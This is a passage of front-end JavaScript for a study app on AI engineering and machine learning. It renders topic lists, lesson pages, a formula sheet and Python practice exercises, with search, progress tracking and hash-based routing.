  app.innerHTML=`<h1>${T.name}</h1><p class="sub">${T.blurb}</p><div class="card"><b>${d} of ${ts.length} topics read</b>${meter(d,ts.length)}</div>${tr==='eng'?`<p class="small" style="margin-top:10px">Several lessons draw on <a href="https://github.com/rohitg00/ai-engineering-from-scratch" target="_blank" rel="noopener">AI Engineering from Scratch</a> by Rohit Ghumare (MIT license); each one links its sources. Benchmark and hardware numbers are as reported at the time and will date.</p>`:''}
  <input class="search" id="q" type="search" placeholder="Search this track, e.g. ${ph}" value="${esc(filter)}" aria-label="Search topics"><div id="list"></div>`;
  listRender();
}
function listRender(){
  const f=filter.trim().toLowerCase(),box=document.getElementById('list');let h='';
  groupsOf(curTrack).forEach((g,gi)=>{
    const ts=trackTopics(curTrack).filter(t=>t.grp===g&&(!f||(t.title+' '+t.tag+' '+t.points.join(' ')+' '+(t.md||'')).toLowerCase().includes(f)));
    if(!ts.length)return;
    h+=`<div class="grp">${g}</div>`;
    ts.forEach(t=>{h+=`<a class="row" href="#${t.id}" style="--c:var(${['--teal','--violet','--amber','--rose'][gi%4]})"><div class="t"><b>${t.title}</b><span>${esc(t.tag)}</span></div><div class="chk ${S.revised[t.id]?'on':''}" aria-label="${S.revised[t.id]?'Revised':'Not revised'}">${S.revised[t.id]?CHECK:''}</div></a>`});
  });
  box.innerHTML=h||`<p class="sub">No topics match “${esc(filter)}”. Try a shorter word.</p>`;
}

/* ---------- Topic ---------- */
function vTopic(t){
  const sib=trackTopics(t.track),i=sib.indexOf(t),p=sib[i-1],n=sib[i+1];
  let h=`<a class="back" href="#${t.track}">Back to ${TRACKS[t.track].name}</a><h1>${t.title}</h1><p class="sub">${t.grp}, ${t.ch}</p>`;
  if(t.md){h+=`<div class="md">${md(t.md)}</div>`}
  else{
    h+=`<p>${t.tag}</p>`;
    if(t.ex)h+=`<h2>In plain words</h2><div class="explain">${t.ex.map(p=>`<p>${p}</p>`).join('')}</div>`;
    if(t.use)h+=useHtml(t.use);
    if(t.fig)h+=`<figure class="fig" style="margin-left:0;margin-right:0">${t.fig()}<figcaption>${t.cap}</figcaption></figure>`;
    if(t.fig2)h+=`<figure class="fig" style="margin-left:0;margin-right:0">${t.fig2()}<figcaption>${t.cap2}</figcaption></figure>`;
    h+=`<h2>Key points</h2><ul class="pts">${t.points.map(x=>`<li>${x}</li>`).join('')}</ul>`;
    if(t.formulas.length)h+=`<h2>Formulas</h2>`+t.formulas.map(f=>`<div class="formula"><small>${f[0]}</small><code>${esc(f[1])}</code></div>`).join('');
    if(t.q)h+=`<h2>Check yourself</h2>`+t.q.map(x=>`<details class="qa"><summary>${x[0]}</summary><p>${x[1]}</p></details>`).join('');
    if(t.links)h+=linksHtml(t.links);
  }
  if(t.src&&t.src.length)h+=`<h2>Source lessons</h2><p class="small">Adapted from AI Engineering from Scratch (MIT license). Open the full lesson for code and exercises.</p><ul class="pts">${t.src.map(x=>`<li><a href="${x[1]}" target="_blank" rel="noopener">${esc(x[0])}</a></li>`).join('')}</ul>`;
  if(EXMAP[t.id])h+=`<h2>Practice in code</h2>`+EXMAP[t.id].map(e=>exHtml(e)).join('');
  h+=`<div class="btns"><button class="btn ${S.revised[t.id]?'on':''}" data-act="rev" data-id="${t.id}">${S.revised[t.id]?'Read (tap to undo)':'Mark as read'}</button></div>`;
  h+=`<div class="nav2">${p?`<a href="#${p.id}"><small>Previous</small>${p.title}</a>`:'<span></span>'}${n?`<a href="#${n.id}"><small>Next</small>${n.title}</a>`:'<span></span>'}</div>`;
  app.innerHTML=h;window.scrollTo(0,0);
}
function useHtml(u){
  return `<section class="use" aria-label="Used in practice"><h2>Used in practice</h2><dl><dt>Scenario</dt><dd>${u.s}</dd><dt>What is used</dt><dd>${u.what}</dd><dt>Why</dt><dd>${u.why}</dd></dl>${u.link?`<a class="uselink" href="${u.link[1]}" target="_blank" rel="noopener">See it in code: ${u.link[0]} ↗</a>`:''}</section>`;
}
/* ---------- Formula sheet ---------- */
function vSheet(){
  let h=`<h1>Formula sheet</h1><p class="sub">Every formula from the topics, in order. Handy for a last-minute pass.</p>${scopeBar()}`;
  ['eng','ml','dl','found'].filter(tr=>S.scope==='all'||S.scope===tr).forEach(tr=>{
    h+=`<h2 style="margin-top:22px">${TRACKS[tr].name}</h2>`;
    trackTopics(tr).filter(t=>t.formulas.length).forEach(t=>{
      h+=`<h3 style="margin:16px 0 4px"><a href="#${t.id}" style="text-decoration:none">${t.title}</a></h3>`+t.formulas.map(f=>`<div class="formula"><small>${f[0]}</small><code>${esc(f[1])}</code></div>`).join('');
    });
  });
  app.innerHTML=h;
}

/* ---------- Practice ---------- */
const EXMAP={};EXERCISES.forEach((e,i)=>{e.i=i;(EXMAP[e.topic]=EXMAP[e.topic]||[]).push(e)});
const today=()=>{const d=new Date();return Math.floor((d.getTime()-d.getTimezoneOffset()*6e4)/864e5)};
const dayLabel=n=>n<=0?'today':(n===1?'1 day':n+' days');
function copyText(t,btn){
  const ok=()=>{if(btn){const o=btn.textContent;btn.textContent='Copied';setTimeout(()=>btn.textContent=o,1200)}};
  const fb=()=>{const ta=document.createElement('textarea');ta.value=t;document.body.appendChild(ta);ta.select();try{document.execCommand('copy');ok()}catch(e){}ta.remove()};
  try{navigator.clipboard.writeText(t).then(ok,fb)}catch(e){fb()}
}
const exKey=e=>e.topic+':'+e.title;
function exHtml(e,open){
  const done=S.exDone[exKey(e)];
  return `<div class="ex card"><div class="exh"><b>${esc(e.title)}</b><span class="badge ${e.level}">${e.level==='challenge'?'Challenge':'Core'}</span></div><p>${esc(e.prompt)}</p>
  <div class="codehead"><span class="small">Starter code</span><button class="btn ghost sm" data-act="copy" data-i="${e.i}" data-w="starter">Copy</button></div><pre class="code"><code>${esc(e.starter)}</code></pre>
  <details class="sol"><summary>Show solution and expected output</summary><div class="codehead"><span class="small">Solution</span><button class="btn ghost sm" data-act="copy" data-i="${e.i}" data-w="solution">Copy</button></div><pre class="code"><code>${esc(e.solution)}</code></pre><div class="small">Expected output</div><pre class="code out"><code>${esc(e.output)}</code></pre>${e.insight?`<p class="small"><b>Insight:</b> ${esc(e.insight)}</p>`:''}</details>
  <div class="btns" style="margin-bottom:0"><button class="btn ${done?'on':'ghost'}" data-act="exdone" data-i="${e.i}">${done?'Solved (tap to undo)':'Mark solved'}</button></div></div>`;
}
function vPractice(){
  const n=EXERCISES.length,d=EXERCISES.filter(e=>S.exDone[exKey(e)]).length;
  let h=`<h1>Practice</h1><p class="sub">Coding exercises for key topics. Run them in Python 3 with NumPy (Google Colab works well). Every solution was run to produce the expected output shown.</p>
  <div class="card"><b>${d} of ${n} exercises solved</b>${meter(d,n)}<span class="small">Challenge exercises are multi-step problems; do the core ones first.</span></div>`;
  ['eng','ml','dl','found'].forEach(tr=>{
    const list=EXERCISES.filter(e=>{const t=TOPICS.find(x=>x.id===e.topic);return t&&t.track===tr});
    if(!list.length)return;
    h+=`<h2>${TRACKS[tr].name}</h2>`;
    list.forEach(e=>{const t=TOPICS.find(x=>x.id===e.topic),done=S.exDone[exKey(e)];
      h+=`<details class="exrow"><summary><span class="chk ${done?'on':''}">${done?CHECK:''}</span><span class="t"><b>${esc(e.title)}</b><span class="small">${esc(t.title)}${e.level==='challenge'?', challenge':''}</span></span></summary>${exHtml(e)}<p class="small"><a href="#${t.id}">Open the topic</a></p></details>`});
  });
  app.innerHTML=h;
}
/* ---------- Routing and events ---------- */
const OLD_IDS={'cards':'home','quiz':'home','news':'home','ai-rag-pattern':'rag-overview','ai-hybrid-retrieval':'rag-hybrid','ai-rag-lessons':'rag-ingestion','ai-rag-eval':'ev-rag','ai-context-eng':'rag-context','ai-llm-evals':'ev-judge','ai-cost-caching':'inf-cost','ai-routing':'inf-cost','ai-self-host':'inf-engines','ai-workflows-agents':'h-orchestration','ai-agent-security':'sec-injection','ai':'eng','drill':'eng','plan':'home','cards':'home','quiz':'home','news':'home'};
function route(){
  let h=(location.hash||'#home').slice(1);
  if(/^gate-/.test(h)){location.replace('#'+h.replace(/^gate-/,'found-'));return}
  if(OLD_IDS[h]||/^ai-/.test(h)){location.replace('#'+(OLD_IDS[h]||'eng'));return}
  const t=TOPICS.find(x=>x.id===h);
  if(t){tabs(t.track);vTopic(t);return}
  const cur=TABS.some(x=>x[0]===h)?h:'home';
  tabs(cur);
  if(cur==='home')vHome();else if(cur==='eng'||cur==='ml'||cur==='dl'||cur==='found')vTrack(cur);else if(cur==='practice')vPractice();else vSheet();
  window.scrollTo(0,0);
}
window.addEventListener('hashchange',route);
app.addEventListener('input',e=>{if(e.target.id==='q'){filter=e.target.value;listRender()}});
app.addEventListener('click',e=>{
  const b=e.target.closest('[data-act]');if(!b)return;
  const a=b.dataset.act;
    if(a==='rev'){const _id=b.dataset.id;S.revised[_id]=!S.revised[_id];if(!S.revised[_id])delete S.revised[_id];save();vTopic(TOPICS.find(t=>t.id===b.dataset.id))}
  else if(a==='reset'){if(confirm('Clear all progress on this device?')){S={revised:{},scope:'all',exDone:{}};save();vHome()}}
  else if(a==='scope'){S.scope=b.dataset.s;save();vSheet()}
  else if(a==='copy'){const e=EXERCISES[+b.dataset.i];copyText(e[b.dataset.w],b)}
  else if(a==='exdone'){const e=EXERCISES[+b.dataset.i],k=exKey(e);S.exDone[k]=!S.exDone[k];if(!S.exDone[k])delete S.exDone[k];save();const det=b.closest('details');const op=det&&det.open;location.hash==='#practice'?vPractice():vTopic(TOPICS.find(t=>t.id===e.topic))}
});
route();

</script>
